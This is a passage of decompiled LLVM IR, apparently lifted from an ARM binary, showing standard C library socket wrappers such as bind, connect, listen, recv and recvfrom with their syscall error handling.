  uselistorder label %dec_label_pc_11cc8, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_11cec = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_11cec, i32* @r1, align 4
  %v0_11cf0 = call i32 @inet_aton()
  %v2_11cf4 = icmp eq i32 %v0_11cf0, 0
  %v4_11cf8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11cf4, i32 -1, i32 %v4_11cf8
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d0c = load i32, i32* @r7, align 4
  store i32 %v3_11d0c, i32* %stack_var_-8, align 4
  %v0_11d18 = load i32, i32* @r0, align 4
  store i32 %v0_11d18, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d18, -4095
  br i1 %tmp, label %dec_label_pc_11d40, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %entry
  %v0_11d2c = call i32 @__aeabi_read_tp()
  %v3_11d30 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11d30 = sext i16 %v3_11d30 to i32
  %v0_11d34 = load i32, i32* %r2.global-to-local, align 4
  %v1_11d34 = sub i32 0, %v0_11d34
  store i32 %v1_11d34, i32* %r2.global-to-local, align 4
  %v3_11d38 = add i32 %v4_11d30, %v0_11d2c
  %v4_11d38 = inttoptr i32 %v3_11d38 to i32*
  store i32 %v1_11d34, i32* %v4_11d38, align 4
  %v2_11d40.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11d40

dec_label_pc_11d40:                               ; preds = %entry, %dec_label_pc_11d28
  %v1_11d44 = phi i32 [ %v0_11d18, %entry ], [ -1, %dec_label_pc_11d28 ]
  %v2_11d40 = phi i32 [ %v3_11d0c, %entry ], [ %v2_11d40.pre, %dec_label_pc_11d28 ]
  store i32 %v2_11d40, i32* @r7, align 4
  ret i32 %v1_11d44

; uselistorder directives
  uselistorder i32 %v0_11d18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d40, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11d48:
  %v0_11d48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d48, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11d48
  %v2_11d4c = load i32, i32* @r4, align 4
  %v3_11d4c = udiv i32 %v2_11d4c, 1024
  %v4_11d4c = mul i32 %v2_11d4c, 4194304
  %v5_11d4c = or i32 %v3_11d4c, %v4_11d4c
  %v8_11d4c = and i32 %v5_11d4c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11d48, %bb
  %v9_11d4c = phi i32 [ %arg1, %dec_label_pc_11d48 ], [ %v8_11d4c, %bb ]
  ret i32 %v9_11d4c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_11d54 = load i32, i32* @r4, align 4
  %v9_11d54 = load i32, i32* @r6, align 4
  %v12_11d54 = load i32, i32* @r7, align 4
  %v4_11d60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_11d64 = icmp eq i32 %v4_11d60, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11d64, label %dec_label_pc_11d7c, label %entry.dec_label_pc_11d88_crit_edge

entry.dec_label_pc_11d88_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11d88

dec_label_pc_11d7c:                               ; preds = %entry
  store i32 %v3_11d54, i32* @r4, align 4
  store i32 %v9_11d54, i32* @r6, align 4
  store i32 %v12_11d54, i32* @r7, align 4
  %v0_11d84 = call i32 @__sys_accept()
  br label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %entry.dec_label_pc_11d88_crit_edge, %dec_label_pc_11d7c
  %v0_11d88 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11d88, i32* @r5, align 4
  %v0_11d98 = load i32, i32* @r4, align 4
  store i32 %v0_11d98, i32* @r0, align 4
  %v0_11d9c = call i32 @__sys_accept()
  store i32 %v0_11d9c, i32* @r4, align 4
  %v0_11da4 = load i32, i32* @r5, align 4
  %v1_11da8 = call i32 @__libc_disable_asynccancel(i32 %v0_11da4)
  %v0_11dac = load i32, i32* @r4, align 4
  store i32 %v12_11d54, i32* @r7, align 4
  ret i32 %v0_11dac

; uselistorder directives
  uselistorder label %dec_label_pc_11d88, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11dc4 = load i32, i32* @r7, align 4
  store i32 %v3_11dc4, i32* %stack_var_-8, align 4
  %v0_11dd0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11dd0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11dd0, -4095
  br i1 %tmp, label %dec_label_pc_11df8, label %dec_label_pc_11de0

dec_label_pc_11de0:                               ; preds = %entry
  %v0_11de4 = call i32 @__aeabi_read_tp()
  %v3_11de8 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11de8 = sext i16 %v3_11de8 to i32
  %v0_11dec = load i32, i32* %r2.global-to-local, align 4
  %v1_11dec = sub i32 0, %v0_11dec
  store i32 %v1_11dec, i32* %r2.global-to-local, align 4
  %v3_11df0 = add i32 %v4_11de8, %v0_11de4
  %v4_11df0 = inttoptr i32 %v3_11df0 to i32*
  store i32 %v1_11dec, i32* %v4_11df0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11df8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11df8

dec_label_pc_11df8:                               ; preds = %entry, %dec_label_pc_11de0
  %v1_11dfc = phi i32 [ %v0_11dd0, %entry ], [ -1, %dec_label_pc_11de0 ]
  %v2_11df8 = phi i32 [ %v3_11dc4, %entry ], [ %v2_11df8.pre, %dec_label_pc_11de0 ]
  store i32 %v2_11df8, i32* @r7, align 4
  ret i32 %v1_11dfc

; uselistorder directives
  uselistorder i32 %v0_11dd0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11df8, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e00:
  %v0_11e00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e00
  %v2_11e04 = load i32, i32* @ip, align 4
  %v5_11e04 = udiv i32 %v2_11e04, 512
  %v6_11e04 = and i32 %v5_11e04, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e00, %bb
  %v7_11e04 = phi i32 [ %arg1, %dec_label_pc_11e00 ], [ %v6_11e04, %bb ]
  ret i32 %v7_11e04

; uselistorder directives
  uselistorder i32 512, { 0, 8, 5, 1, 2, 9, 6, 10, 7, 11, 3, 12, 4, 13 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e08 = load i32, i32* @r7, align 4
  store i32 %v3_11e08, i32* %stack_var_-8, align 4
  %v0_11e14 = load i32, i32* @r0, align 4
  store i32 %v0_11e14, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e14, -4095
  br i1 %tmp, label %dec_label_pc_11e3c, label %dec_label_pc_11e24

dec_label_pc_11e24:                               ; preds = %entry
  %v0_11e28 = call i32 @__aeabi_read_tp()
  %v3_11e2c = load i16, i16* @global_var_2229c.359, align 2
  %v4_11e2c = sext i16 %v3_11e2c to i32
  store i32 %v4_11e2c, i32* @r3, align 4
  %v0_11e30 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e30 = sub i32 0, %v0_11e30
  store i32 %v1_11e30, i32* %r2.global-to-local, align 4
  %v3_11e34 = add i32 %v4_11e2c, %v0_11e28
  %v4_11e34 = inttoptr i32 %v3_11e34 to i32*
  store i32 %v1_11e30, i32* %v4_11e34, align 4
  %v2_11e3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e3c:                               ; preds = %entry, %dec_label_pc_11e24
  %v1_11e40 = phi i32 [ %v0_11e14, %entry ], [ -1, %dec_label_pc_11e24 ]
  %v2_11e3c = phi i32 [ %v3_11e08, %entry ], [ %v2_11e3c.pre, %dec_label_pc_11e24 ]
  store i32 %v2_11e3c, i32* @r7, align 4
  ret i32 %v1_11e40

; uselistorder directives
  uselistorder i32 %v0_11e14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e3c, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e44:
  %v0_11e44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e44, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e44
  %v2_11e48 = load i32, i32* @r8, align 4
  %v3_11e48 = udiv i32 %v2_11e48, 256
  %v4_11e48 = mul i32 %v2_11e48, 16777216
  %v5_11e48 = or i32 %v3_11e48, %v4_11e48
  %v8_11e48 = and i32 %v5_11e48, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e44, %bb
  %v9_11e48 = phi i32 [ %arg1, %dec_label_pc_11e44 ], [ %v8_11e48, %bb ]
  ret i32 %v9_11e48

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11e50 = load i32, i32* @r4, align 4
  store i32 %v3_11e50, i32* %stack_var_-20, align 4
  %v6_11e50 = load i32, i32* @r5, align 4
  %v9_11e50 = load i32, i32* @r6, align 4
  %v12_11e50 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r3, align 4
  %v4_11e5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  store i32 %v4_11e5c, i32* @ip, align 4
  %v2_11e60 = icmp eq i32 %v4_11e5c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11e60, label %dec_label_pc_11e78, label %entry.dec_label_pc_11e84_crit_edge

entry.dec_label_pc_11e84_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11e84

dec_label_pc_11e78:                               ; preds = %entry
  store i32 %v3_11e50, i32* @r4, align 4
  store i32 %v9_11e50, i32* @r6, align 4
  store i32 %v12_11e50, i32* @r7, align 4
  %v0_11e80 = call i32 @__sys_connect()
  br label %dec_label_pc_11e84

dec_label_pc_11e84:                               ; preds = %entry.dec_label_pc_11e84_crit_edge, %dec_label_pc_11e78
  %v0_11e84 = call i32 @__libc_enable_asynccancel()
  %v0_11e88 = load i32, i32* @r6, align 4
  store i32 %v0_11e88, i32* @r1, align 4
  store i32 %v0_11e84, i32* @r5, align 4
  %v0_11e94 = load i32, i32* @r4, align 4
  store i32 %v0_11e94, i32* @r0, align 4
  %v0_11e98 = call i32 @__sys_connect()
  store i32 %v0_11e98, i32* @r4, align 4
  %v0_11ea0 = load i32, i32* @r5, align 4
  %v1_11ea4 = call i32 @__libc_disable_asynccancel(i32 %v0_11ea0)
  %v0_11ea8 = load i32, i32* @r4, align 4
  %v2_11eb0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11eb0, i32* @r4, align 4
  store i32 %v6_11e50, i32* @r5, align 4
  store i32 %v9_11e50, i32* @r6, align 4
  store i32 %v12_11e50, i32* @r7, align 4
  ret i32 %v0_11ea8

; uselistorder directives
  uselistorder label %dec_label_pc_11e84, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ec0 = load i32, i32* @r7, align 4
  store i32 %v3_11ec0, i32* %stack_var_-8, align 4
  %v0_11ecc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11ecc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ecc, -4095
  br i1 %tmp, label %dec_label_pc_11ef4, label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %entry
  %v0_11ee0 = call i32 @__aeabi_read_tp()
  %v3_11ee4 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11ee4 = sext i16 %v3_11ee4 to i32
  %v0_11ee8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ee8 = sub i32 0, %v0_11ee8
  store i32 %v1_11ee8, i32* %r2.global-to-local, align 4
  %v3_11eec = add i32 %v4_11ee4, %v0_11ee0
  %v4_11eec = inttoptr i32 %v3_11eec to i32*
  store i32 %v1_11ee8, i32* %v4_11eec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ef4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %entry, %dec_label_pc_11edc
  %v1_11ef8 = phi i32 [ %v0_11ecc, %entry ], [ -1, %dec_label_pc_11edc ]
  %v2_11ef4 = phi i32 [ %v3_11ec0, %entry ], [ %v2_11ef4.pre, %dec_label_pc_11edc ]
  store i32 %v2_11ef4, i32* @r7, align 4
  ret i32 %v1_11ef8

; uselistorder directives
  uselistorder i32 %v0_11ecc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ef4, { 1, 0 }
}

define i32 @"$d.5"(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11efc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_11efc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11efc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11efc
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v2_11efc = load i32, i32* @lr, align 4
  %v9_11efc = shl i32 %v2_11efc, %arg2
  %v10_11efc = and i32 %v9_11efc, %tmp
  store i32 %v10_11efc, i32* %r0.global-to-local, align 4
  %v2_11f00 = trunc i32 %v10_11efc to i16
  store i16 %v2_11f00, i16* %tmp2, align 2
  %v6_11f00 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11efc, %bb
  %v10_11f00 = phi i32 [ %tmp, %dec_label_pc_11efc ], [ %v6_11f00, %bb ]
  ret i32 %v10_11f00

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11f04 = load i32, i32* @r4, align 4
  store i32 %v3_11f04, i32* %stack_var_-12, align 4
  %v0_11f14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f14, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f14, -4095
  br i1 %tmp, label %dec_label_pc_11f3c, label %dec_label_pc_11f24

dec_label_pc_11f24:                               ; preds = %entry
  %v0_11f28 = call i32 @__aeabi_read_tp()
  %v3_11f2c = load i16, i16* @global_var_2229c.359, align 2
  %v4_11f2c = sext i16 %v3_11f2c to i32
  %v0_11f30 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f30 = sub i32 0, %v0_11f30
  store i32 %v1_11f30, i32* %r2.global-to-local, align 4
  %v3_11f34 = add i32 %v4_11f2c, %v0_11f28
  %v4_11f34 = inttoptr i32 %v3_11f34 to i32*
  store i32 %v1_11f30, i32* %v4_11f34, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f3c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11f3c

dec_label_pc_11f3c:                               ; preds = %entry, %dec_label_pc_11f24
  %v1_11f40 = phi i32 [ %v0_11f14, %entry ], [ -1, %dec_label_pc_11f24 ]
  %v2_11f3c = phi i32 [ %v3_11f04, %entry ], [ %v2_11f3c.pre, %dec_label_pc_11f24 ]
  store i32 %v2_11f3c, i32* @r4, align 4
  ret i32 %v1_11f40

; uselistorder directives
  uselistorder i32 %v0_11f14, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f3c, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11f44:
  %v0_11f44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f44, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11f44
  %v2_11f48 = load i32, i32* @r8, align 4
  %v3_11f48 = udiv i32 %v2_11f48, 64
  %v4_11f48 = mul i32 %v2_11f48, 67108864
  %v5_11f48 = or i32 %v3_11f48, %v4_11f48
  %v8_11f48 = and i32 %v5_11f48, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f44, %bb
  %v9_11f48 = phi i32 [ %arg1, %dec_label_pc_11f44 ], [ %v8_11f48, %bb ]
  ret i32 %v9_11f48

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f4c = load i32, i32* @r7, align 4
  store i32 %v3_11f4c, i32* %stack_var_-8, align 4
  %v0_11f58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f58, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f58, -4095
  br i1 %tmp, label %dec_label_pc_11f80, label %dec_label_pc_11f68

dec_label_pc_11f68:                               ; preds = %entry
  %v0_11f6c = call i32 @__aeabi_read_tp()
  %v3_11f70 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11f70 = sext i16 %v3_11f70 to i32
  %v0_11f74 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f74 = sub i32 0, %v0_11f74
  store i32 %v1_11f74, i32* %r2.global-to-local, align 4
  %v3_11f78 = add i32 %v4_11f70, %v0_11f6c
  %v4_11f78 = inttoptr i32 %v3_11f78 to i32*
  store i32 %v1_11f74, i32* %v4_11f78, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11f80.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11f80

dec_label_pc_11f80:                               ; preds = %entry, %dec_label_pc_11f68
  %v1_11f84 = phi i32 [ %v0_11f58, %entry ], [ -1, %dec_label_pc_11f68 ]
  %v2_11f80 = phi i32 [ %v3_11f4c, %entry ], [ %v2_11f80.pre, %dec_label_pc_11f68 ]
  store i32 %v2_11f80, i32* @r7, align 4
  ret i32 %v1_11f84

; uselistorder directives
  uselistorder i32 %v0_11f58, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f80, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f8c = load i32, i32* @r7, align 4
  store i32 %v3_11f8c, i32* %stack_var_-8, align 4
  %v0_11f98 = load i32, i32* @r0, align 4
  store i32 %v0_11f98, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f98, -4095
  br i1 %tmp, label %dec_label_pc_11fc0, label %dec_label_pc_11fa8

dec_label_pc_11fa8:                               ; preds = %entry
  %v0_11fac = call i32 @__aeabi_read_tp()
  %v3_11fb0 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11fb0 = sext i16 %v3_11fb0 to i32
  %v0_11fb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11fb4 = sub i32 0, %v0_11fb4
  store i32 %v1_11fb4, i32* %r2.global-to-local, align 4
  %v3_11fb8 = add i32 %v4_11fb0, %v0_11fac
  %v4_11fb8 = inttoptr i32 %v3_11fb8 to i32*
  store i32 %v1_11fb4, i32* %v4_11fb8, align 4
  %v2_11fc0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11fc0

dec_label_pc_11fc0:                               ; preds = %entry, %dec_label_pc_11fa8
  %v1_11fc4 = phi i32 [ %v0_11f98, %entry ], [ -1, %dec_label_pc_11fa8 ]
  %v2_11fc0 = phi i32 [ %v3_11f8c, %entry ], [ %v2_11fc0.pre, %dec_label_pc_11fa8 ]
  store i32 %v2_11fc0, i32* @r7, align 4
  ret i32 %v1_11fc4

; uselistorder directives
  uselistorder i32 %v0_11f98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11fc0, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11fc8:
  %v0_11fc8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11fc8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11fc8
  %v2_11fcc = load i32, i32* @r4, align 4
  %v3_11fcc = udiv i32 %v2_11fcc, 32
  %v4_11fcc = mul i32 %v2_11fcc, 134217728
  %v5_11fcc = or i32 %v3_11fcc, %v4_11fcc
  %v8_11fcc = and i32 %v5_11fcc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11fc8, %bb
  %v9_11fcc = phi i32 [ %arg1, %dec_label_pc_11fc8 ], [ %v8_11fcc, %bb ]
  ret i32 %v9_11fcc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11fd4 = load i32, i32* @r4, align 4
  store i32 %v3_11fd4, i32* %stack_var_-24, align 4
  %v6_11fd4 = load i32, i32* @r5, align 4
  %v9_11fd4 = load i32, i32* @r6, align 4
  %v12_11fd4 = load i32, i32* @r7, align 4
  %v15_11fd4 = load i32, i32* @r8, align 4
  %v18_11fd4 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @ip, align 4
  %v4_11fe0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_11fe4 = icmp eq i32 %v4_11fe0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11fe4, label %dec_label_pc_11ffc, label %entry.dec_label_pc_12004_crit_edge

entry.dec_label_pc_12004_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12004

dec_label_pc_11ffc:                               ; preds = %entry
  store i32 %v3_11fd4, i32* @r4, align 4
  store i32 %v9_11fd4, i32* @r6, align 4
  store i32 %v12_11fd4, i32* @r7, align 4
  store i32 %v15_11fd4, i32* @r8, align 4
  %v0_12000 = call i32 @__sys_recv()
  br label %dec_label_pc_12004

dec_label_pc_12004:                               ; preds = %entry.dec_label_pc_12004_crit_edge, %dec_label_pc_11ffc
  %v0_12004 = call i32 @__libc_enable_asynccancel()
  %v0_12008 = load i32, i32* @r6, align 4
  store i32 %v0_12008, i32* @r1, align 4
  store i32 %v0_12004, i32* @r5, align 4
  %v0_12018 = load i32, i32* @r4, align 4
  store i32 %v0_12018, i32* @r0, align 4
  %v0_1201c = call i32 @__sys_recv()
  store i32 %v0_1201c, i32* @r4, align 4
  %v0_12024 = load i32, i32* @r5, align 4
  %v1_12028 = call i32 @__libc_disable_asynccancel(i32 %v0_12024)
  %v0_1202c = load i32, i32* @r4, align 4
  %v2_12030 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12030, i32* @r4, align 4
  store i32 %v6_11fd4, i32* @r5, align 4
  store i32 %v9_11fd4, i32* @r6, align 4
  store i32 %v12_11fd4, i32* @r7, align 4
  store i32 %v15_11fd4, i32* @r8, align 4
  store i32 %v18_11fd4, i32* @lr, align 4
  ret i32 %v0_1202c

; uselistorder directives
  uselistorder label %dec_label_pc_12004, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12040 = load i32, i32* @r4, align 4
  store i32 %v3_12040, i32* %stack_var_-16, align 4
  %v0_12054 = load i32, i32* @r0, align 4
  store i32 %v0_12054, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12054, -4095
  br i1 %tmp, label %dec_label_pc_1207c, label %dec_label_pc_12064

dec_label_pc_12064:                               ; preds = %entry
  %v0_12068 = call i32 @__aeabi_read_tp()
  %v3_1206c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1206c = sext i16 %v3_1206c to i32
  %v0_12070 = load i32, i32* %r2.global-to-local, align 4
  %v1_12070 = sub i32 0, %v0_12070
  store i32 %v1_12070, i32* %r2.global-to-local, align 4
  %v3_12074 = add i32 %v4_1206c, %v0_12068
  %v4_12074 = inttoptr i32 %v3_12074 to i32*
  store i32 %v1_12070, i32* %v4_12074, align 4
  %v2_1207c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %entry, %dec_label_pc_12064
  %v1_12080 = phi i32 [ %v0_12054, %entry ], [ -1, %dec_label_pc_12064 ]
  %v2_1207c = phi i32 [ %v3_12040, %entry ], [ %v2_1207c.pre, %dec_label_pc_12064 ]
  store i32 %v2_1207c, i32* @r4, align 4
  ret i32 %v1_12080

; uselistorder directives
  uselistorder i32 %v0_12054, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1207c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12088 = load i32, i32* @r4, align 4
  store i32 %v3_12088, i32* %stack_var_-32, align 4
  %v6_12088 = load i32, i32* @r5, align 4
  %v9_12088 = load i32, i32* @r6, align 4
  %v12_12088 = load i32, i32* @r7, align 4
  %v15_12088 = load i32, i32* @r8, align 4
  %v18_12088 = load i32, i32* @sb, align 4
  %v21_12088 = load i32, i32* @sl, align 4
  %v24_12088 = load i32, i32* @lr, align 4
  %v4_12098 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_120a0 = icmp eq i32 %v4_12098, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_120a0, label %dec_label_pc_120c0, label %dec_label_pc_120cc

dec_label_pc_120c0:                               ; preds = %entry
  store i32 %v3_12088, i32* @r4, align 4
  store i32 %v12_12088, i32* @r7, align 4
  store i32 %v15_12088, i32* @r8, align 4
  store i32 %v18_12088, i32* %sb.global-to-local, align 4
  %v0_120c8 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_120cc

dec_label_pc_120cc:                               ; preds = %entry, %dec_label_pc_120c0
  %v0_120cc = call i32 @__libc_enable_asynccancel()
  %v0_120d0 = load i32, i32* @r7, align 4
  store i32 %v0_120d0, i32* @r1, align 4
  store i32 %v0_120cc, i32* @r5, align 4
  %v0_120e0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_120e0, i32* @r0, align 4
  %v0_120e8 = call i32 @__sys_recvfrom()
  store i32 %v0_120e8, i32* @r4, align 4
  %v0_120f0 = load i32, i32* @r5, align 4
  %v1_120f4 = call i32 @__libc_disable_asynccancel(i32 %v0_120f0)
  %v0_120f8 = load i32, i32* @r4, align 4
  %v2_12100 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12100, i32* @r4, align 4
  store i32 %v6_12088, i32* @r5, align 4
  store i32 %v9_12088, i32* @r6, align 4
  store i32 %v12_12088, i32* @r7, align 4
  store i32 %v15_12088, i32* @r8, align 4
  store i32 %v18_12088, i32* @sb, align 4
  store i32 %v21_12088, i32* @sl, align 4
  store i32 %v24_12088, i32* @lr, align 4
  ret i32 %v0_120f8

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
